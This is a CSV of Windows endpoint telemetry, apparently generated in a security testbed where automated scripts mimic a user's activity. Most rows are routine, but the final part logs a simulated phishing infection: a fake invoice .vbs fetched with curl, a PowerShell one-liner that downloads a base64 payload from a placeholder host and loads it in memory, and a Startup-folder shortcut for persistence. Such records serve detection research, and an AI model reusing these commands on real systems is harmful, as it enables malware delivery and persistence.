host,processUUID,processName,event,objectType,objectData,objectUUID,timestamp,CommandLine
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,665c7889-6756-4c4d-a9e5-de94d284267e,20:45.5,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,5a5804cb-cceb-4967-a118-9018925bf9df,20:46.3,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,7b571e69-e394-4d40-ad68-96775ced4e16,20:47.1,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,c92bba09-e4ef-457b-a3b6-7d4a13ae8b9f,20:52.1,
win10-1,c92bba09-e4ef-457b-a3b6-7d4a13ae8b9f,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,20:52.1,explorer.exe C:\Users\Public\Documents
win10-1,c92bba09-e4ef-457b-a3b6-7d4a13ae8b9f,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,b32dfb47-29a2-469f-a9b0-e97e7ceb330e,20:52.1,
win10-1,dd57c4fe-1800-4c1f-aa41-5bf3cdcac5c5,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,8bac4fad-60aa-4de4-b883-9377ef7a0cc6,20:52.1,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,babf02c2-18e9-43a3-a5d5-f99b1ebe67d7,20:55.2,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,1b062f6d-e933-4aad-b1f9-c7ec9f2aec07,20:56.0,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,8a270d91-88b8-4549-b707-a5bf171db2c6,20:56.7,
win10-1,8bac4fad-60aa-4de4-b883-9377ef7a0cc6,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,20:58.9,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win10-1,8bac4fad-60aa-4de4-b883-9377ef7a0cc6,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,5ca5093b-26e2-4d12-b258-abf7fdc47ef0,20:58.9,
win10-1,51d271de-278f-45d3-9e58-985fc40d5303,C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE,receive,socket,20.189.173.4:443.0,da6f43d6-d05d-4b0f-81f3-9fd724e93068,20:59.5,
win10-1,51d271de-278f-45d3-9e58-985fc40d5303,C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE,send,socket,20.189.173.4:443.0,da6f43d6-d05d-4b0f-81f3-9fd724e93068,20:59.5,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,8ec65fea-65d8-402c-a1ff-b66458a65d8d,21:09.6,
win10-1,8ec65fea-65d8-402c-a1ff-b66458a65d8d,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,21:09.6,explorer.exe C:\Users\Public\Documents
win10-1,8ec65fea-65d8-402c-a1ff-b66458a65d8d,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,c152bf1b-e34e-4ac3-a862-af1416d747b5,21:09.6,
win10-1,dd57c4fe-1800-4c1f-aa41-5bf3cdcac5c5,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,74b84807-a595-4693-8e18-45fec9253258,21:09.7,
win10-1,74b84807-a595-4693-8e18-45fec9253258,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,21:16.4,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win10-1,74b84807-a595-4693-8e18-45fec9253258,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,c47a8960-4fab-46a9-ae85-a1335398ab81,21:16.4,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,38926ebf-5501-4252-8a88-0aff6f214660,21:21.1,
win10-1,38926ebf-5501-4252-8a88-0aff6f214660,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,21:21.2,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win10-1,38926ebf-5501-4252-8a88-0aff6f214660,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,d2b8329d-68b9-41c4-8475-d3eb8eb1f171,21:21.2,
win10-1,11d66e45-887a-4c02-b00a-77dbbca7617f,C:\Windows\System32\services.exe,fork,process,C:\Program Files\Google\Chrome\Application\130.0.6723.92\elevation_service.exe,8690b7e9-2363-4731-b64d-1bf4bb239564,21:21.5,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,f911f627-ccc2-4f7f-8493-5b23593aa7e8,21:34.0,
win10-1,f911f627-ccc2-4f7f-8493-5b23593aa7e8,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,21:34.0,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win10-1,f911f627-ccc2-4f7f-8493-5b23593aa7e8,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,7b57ac7b-3fd2-4a91-9317-a5ef38308547,21:34.0,
win10-1,11d66e45-887a-4c02-b00a-77dbbca7617f,C:\Windows\System32\services.exe,fork,process,C:\Program Files\Google\Chrome\Application\130.0.6723.92\elevation_service.exe,2bbd90f2-3659-4eb6-960e-2e24014d397f,21:34.4,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,f03a182a-a338-4f15-ac5c-646d76040c6d,21:45.6,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,ae0e0099-1808-41f0-9ab6-0aa5206dc1df,21:46.3,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,89ac3f63-f1a8-4616-86e1-923e3a233551,21:47.1,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,f2b2f8ae-7042-433e-a3d9-a053ea91f71e,21:48.2,
win10-1,f2b2f8ae-7042-433e-a3d9-a053ea91f71e,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,21:48.3,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win10-1,f2b2f8ae-7042-433e-a3d9-a053ea91f71e,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,740250be-835b-4eec-9348-a01a1e411f84,21:48.3,
win10-1,11d66e45-887a-4c02-b00a-77dbbca7617f,C:\Windows\System32\services.exe,fork,process,C:\Program Files\Google\Chrome\Application\130.0.6723.92\elevation_service.exe,4dd1644d-2d58-49b4-a4ce-149fb2f79dfd,21:48.6,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,38db3c82-70e8-4099-ba43-acc9a9bcf3df,21:55.2,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,e2feb8f9-ad9b-4455-ad30-66e787c40208,21:56.0,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,bf71d691-b56a-4178-a25a-fe0a44633dc9,21:56.8,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,e71c132a-157f-400d-b28d-b112d9f1c9ca,22:32.1,
win10-1,e71c132a-157f-400d-b28d-b112d9f1c9ca,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,22:32.1,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win10-1,e71c132a-157f-400d-b28d-b112d9f1c9ca,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,f946e399-b974-4510-b78b-384283081643,22:32.1,
win10-1,11d66e45-887a-4c02-b00a-77dbbca7617f,C:\Windows\System32\services.exe,fork,process,C:\Program Files\Google\Chrome\Application\130.0.6723.92\elevation_service.exe,e728c082-d36d-416d-bdf3-3a77c7b73142,22:32.4,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,7881d285-d787-459a-a373-b776e6e589ed,22:44.9,
win10-1,7881d285-d787-459a-a373-b776e6e589ed,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,3a48b967-d2f1-4a7a-a906-7535ec679689,22:45.0,
win10-1,dd57c4fe-1800-4c1f-aa41-5bf3cdcac5c5,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,bf45fcc4-7c53-4e91-b936-a6d2b12aefea,22:45.0,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,7be3fbdb-10dd-4456-8af3-61c72bc856d4,22:45.6,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,a394402a-6652-496f-97a1-828c3444ad74,22:46.2,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,1f9a84b3-f27e-4d47-8aad-9f55d507bd2b,22:46.9,
win10-1,bf45fcc4-7c53-4e91-b936-a6d2b12aefea,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,22:51.8,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win10-1,bf45fcc4-7c53-4e91-b936-a6d2b12aefea,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4236497a-eca9-4300-839e-c804b1fc71cb,22:51.8,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,ec683bd0-0ec6-46cc-8651-a45c0434e6ee,22:55.2,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,498be919-89c9-444e-839b-f468e7d2f7fb,22:56.0,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,4f3e40ff-93d3-40ff-a549-76198e3e30ee,22:56.7,
win10-1,97a16472-0668-4c6c-ac36-c8751cf0abca,C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE,receive,socket,20.189.173.15:443.0,c2c06ab7-70c0-4829-9474-7d252492c926,22:56.9,
win10-1,97a16472-0668-4c6c-ac36-c8751cf0abca,C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE,send,socket,20.189.173.15:443.0,c2c06ab7-70c0-4829-9474-7d252492c926,22:56.9,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,8418a46e-305d-4dfb-be65-432ffb41d1a7,22:59.5,
win10-1,8418a46e-305d-4dfb-be65-432ffb41d1a7,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\System32\cmd.exe,ba01a43e-9c47-48f5-81b3-3f87adc8d086,22:59.5,C:\windows\system32\cmd.exe /c download-fac-with-curl.bat
win10-1,8418a46e-305d-4dfb-be65-432ffb41d1a7,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\System32\cmd.exe,414f7f81-2238-4a44-96a6-dc7078d91391,22:59.5,
win10-1,414f7f81-2238-4a44-96a6-dc7078d91391,C:\Windows\System32\cmd.exe,execute,file,C:\Windows\System32\curl.exe,df7497ef-f3b8-478e-8a79-7a1273f6ae34,22:59.6,curl  -o C:\Users\user\Downloads\factura-228447578537.pdf.vbs http://dian-info.com/notificaciones/contribuyentes/factura-228447578537
win10-1,414f7f81-2238-4a44-96a6-dc7078d91391,C:\Windows\System32\cmd.exe,fork,process,C:\Windows\System32\curl.exe,fdad9628-a4b1-4a01-9164-c74bae4a58d7,22:59.6,
win10-1,8418a46e-305d-4dfb-be65-432ffb41d1a7,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,a4c0718c-9d8b-4140-8fb9-e4a36e51dc40,22:59.6,"""C:\Program Files\Microsoft Office\Root\Office16\OUTLOOK.EXE"" /eml ""C:\Users\user\cbg-cyber-testbed\src\data\eml\Notificacion de Pago Pendiente.eml"""
win10-1,8418a46e-305d-4dfb-be65-432ffb41d1a7,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,863adb46-4188-4aee-b543-b5ac30c8b6f9,22:59.6,
win10-1,fdad9628-a4b1-4a01-9164-c74bae4a58d7,C:\windows\system32\curl.exe,write,file,C:\Users\user\Downloads\factura-228447578537.pdf.vbs,f5bf6bd8-0562-463a-80a0-ce7215b3b37b,22:59.7,
win10-1,863adb46-4188-4aee-b543-b5ac30c8b6f9,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,23:03.8,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --single-argument http://dian-info.com/notificaciones/contribuyentes/factura-228447578537"
win10-1,863adb46-4188-4aee-b543-b5ac30c8b6f9,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,5b4256f6-c4b6-40a0-8830-c446a3d2a72b,23:03.8,
win10-1,11d66e45-887a-4c02-b00a-77dbbca7617f,C:\Windows\System32\services.exe,fork,process,C:\Program Files\Google\Chrome\Application\130.0.6723.92\elevation_service.exe,bfe35bef-59c2-4a70-abc0-2739ffc96dd7,23:04.1,
win10-1,5b4256f6-c4b6-40a0-8830-c446a3d2a72b,C:\Program Files\Google\Chrome\Application\chrome.exe,write,file,C:\Users\user\Downloads\93899a41-cbf5-4b1a-8e6e-313ce2bb2dc4.tmp,3acb0ce5-7f12-4d04-9a55-8281d8cbb309,23:04.5,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,ba6ba6a0-308c-4e91-99f4-43522f02a6ba,23:15.4,
win10-1,ba6ba6a0-308c-4e91-99f4-43522f02a6ba,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\System32\wscript.exe,f888b8e0-8e76-4db7-a3c3-e9d34ad77fef,23:15.5,"""C:\windows\System32\WScript.exe"" ""C:\Users\user\Downloads\factura-228447578537.pdf.vbs"""
win10-1,ba6ba6a0-308c-4e91-99f4-43522f02a6ba,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\System32\wscript.exe,979ed0a9-8141-4ebe-9049-2e2016759e04,23:15.5,
win10-1,979ed0a9-8141-4ebe-9049-2e2016759e04,C:\Windows\System32\wscript.exe,execute,file,C:\Windows\System32\cmd.exe,ba01a43e-9c47-48f5-81b3-3f87adc8d086,23:15.7,"""C:\windows\system32\cmd.exe"" /c powershell.exe [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('http://CDN_FIBER/dll/new_rump_vb.net.txt'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('ø☀☞√�}П�◀@+@░�@@ø☀☞√�}П�.ysa4*●*☞#:▶REBIF_NDC4*●*☞#:▶4*●*☞#:▶▶☟ð}↓→+◀pø☀☞√�}П�ø☀☞√�}П�↓*(▲☟@*⇝'))"
win10-1,979ed0a9-8141-4ebe-9049-2e2016759e04,C:\Windows\System32\wscript.exe,fork,process,C:\Windows\System32\cmd.exe,2e6016f5-7da6-4ea0-aa8f-4646336ff921,23:15.7,
win10-1,2e6016f5-7da6-4ea0-aa8f-4646336ff921,C:\Windows\System32\cmd.exe,execute,file,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6d41b2d8-7340-409e-8e15-fabf018cc2c7,23:15.7,"powershell.exe  [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('http://CDN_FIBER/dll/new_rump_vb.net.txt'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('ø☀☞√�}П�◀@+@░�@@ø☀☞√�}П�.ysa4*●*☞#:▶REBIF_NDC4*●*☞#:▶4*●*☞#:▶▶☟ð}↓→+◀pø☀☞√�}П�ø☀☞√�}П�↓*(▲☟@*⇝'))"
win10-1,2e6016f5-7da6-4ea0-aa8f-4646336ff921,C:\Windows\System32\cmd.exe,fork,process,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6f25669b-0f52-407f-8a3b-ee10ae5c95b6,23:15.7,
win10-1,6f25669b-0f52-407f-8a3b-ee10ae5c95b6,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,write,file,C:\Users\user\AppData\Local\Temp\__PSScriptPolicyTest_zjfa44s4.qux.ps1,4888fab6-0a4c-4b29-b2dc-79f36bf47dd8,23:15.9,
win10-1,6f25669b-0f52-407f-8a3b-ee10ae5c95b6,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,write,file,C:\Users\user\Downloads\fiber_logs.txt,f155cf93-e154-4ab1-aaaf-751d92c8ec9a,23:16.1,
win10-1,6f25669b-0f52-407f-8a3b-ee10ae5c95b6,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,execute,file,C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe,45811814-a282-490d-a49d-3fe52153f8ba,23:16.1,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe"""
win10-1,6f25669b-0f52-407f-8a3b-ee10ae5c95b6,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,fork,process,C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe,f05022cc-4750-4fcb-b8c8-153f1b0212bf,23:16.1,
win10-1,6f25669b-0f52-407f-8a3b-ee10ae5c95b6,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,write,file,C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\notepad.lnk,30c8bc96-40ce-40cd-896b-07c84b82e61f,23:16.1,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,d6a38d55-3f90-40d1-8997-e812b7ceb0ea,23:21.3,
win10-1,d6a38d55-3f90-40d1-8997-e812b7ceb0ea,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,23:21.4,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win10-1,d6a38d55-3f90-40d1-8997-e812b7ceb0ea,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,beecb409-6a27-4798-8bdb-9c0aa778542e,23:21.4,
win10-1,11d66e45-887a-4c02-b00a-77dbbca7617f,C:\Windows\System32\services.exe,fork,process,C:\Program Files\Google\Chrome\Application\130.0.6723.92\elevation_service.exe,621c4de6-f31d-468b-a8ff-d84ec7782b7e,23:21.6,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,97716ce9-170b-49e8-a7a5-8460eebd92e7,23:35.6,
win10-1,97716ce9-170b-49e8-a7a5-8460eebd92e7,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,23:35.6,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win10-1,97716ce9-170b-49e8-a7a5-8460eebd92e7,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,dfc22a8a-dd9d-4da2-81e9-54c885fca12e,23:35.6,
win10-1,11d66e45-887a-4c02-b00a-77dbbca7617f,C:\Windows\System32\services.exe,fork,process,C:\Program Files\Google\Chrome\Application\130.0.6723.92\elevation_service.exe,c68b5692-6892-4a3b-9b75-9a497353df5c,23:36.0,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,f87c944c-8846-4938-a36f-0892527609e9,23:45.6,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,a7fb847e-d6f3-471c-aa57-732f3fa258aa,23:46.2,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,f444e4b9-4259-41ce-b936-f1bd744a85d2,23:46.8,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,cc52cbbb-416b-4d91-bfbc-54292b2fe688,23:48.5,
win10-1,cc52cbbb-416b-4d91-bfbc-54292b2fe688,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,23:48.5,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win10-1,cc52cbbb-416b-4d91-bfbc-54292b2fe688,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,f1e9b65b-1dde-461b-8f83-961dda13cd73,23:48.5,
win10-1,11d66e45-887a-4c02-b00a-77dbbca7617f,C:\Windows\System32\services.exe,fork,process,C:\Program Files\Google\Chrome\Application\130.0.6723.92\elevation_service.exe,ba56897b-695d-43e1-9ca7-7cd995c97184,23:48.8,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,3ac77c1a-3069-4cc3-aed1-edb1ab71e359,23:55.2,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,70f2db4c-ab43-4dcf-a1de-8796bf171ebd,23:56.0,
win10-1,ad15d48c-ac97-43c3-9523-32b93a75090c,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,d8eabfd0-63fb-497d-945d-e1a269ac465a,23:56.8,
win10-1,616d30a4-06f4-4258-8359-9d5dd193f9f7,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,6728df29-5813-4f57-98da-197bbbdd48f0,24:02.7,
win10-1,6728df29-5813-4f57-98da-197bbbdd48f0,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,24:02.8,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win10-1,6728df29-5813-4f57-98da-197bbbdd48f0,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,f5a850d6-d774-4301-b21e-4ca3af607942,24:02.8,
win10-1,11d66e45-887a-4c02-b00a-77dbbca7617f,C:\Windows\System32\services.exe,fork,process,C:\Program Files\Google\Chrome\Application\130.0.6723.92\elevation_service.exe,fb2041e0-d73d-448a-bd48-901104f84e07,24:03.1,
